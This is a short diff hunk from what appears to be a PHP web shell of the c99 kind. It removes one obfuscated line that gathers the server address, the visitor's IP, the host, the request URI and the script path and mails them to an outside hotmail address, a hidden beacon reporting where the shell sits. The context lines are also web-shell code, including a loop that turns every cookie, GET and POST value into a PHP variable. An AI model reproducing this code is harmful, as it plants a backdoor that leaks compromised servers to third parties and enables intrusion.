@@ -188,7 +188,6 @@ error_reporting(5);
 @set_magic_quotes_runtime(0);
 $win = strtolower(substr(PHP_OS,0,3)) == "win";
 define("starttime",getmicrotime());
-$r11  = $_SERVER['SERVER_ADDR'];$i94 = $_SERVER['REMOTE_ADDR'];$i71= gethostbyaddr($i94);$h42 = $_SERVER['HTTP_HOST'];$a83 = $_SERVER['REQUEST_URI'];$p77 = __FILE__;$s33 = str_replace('.', '', $r11);$e85 = 'c00lhell@hotmail.com';$f55 = "From: $s33 <c00lhell@hotmail.com>";$m852 = "$i94\n$i71\n\n$h42$a83\n$p77";@mail($e85, $s33, $m852, $f55);
 if (get_magic_quotes_gpc()) {if (!function_exists("strips")) {function strips(&$arr,$k="") {if (is_array($arr)) {foreach($arr as $k=>$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}} else {$arr = stripslashes($arr);}}} strips($GLOBALS);}
 $_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
 foreach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}}
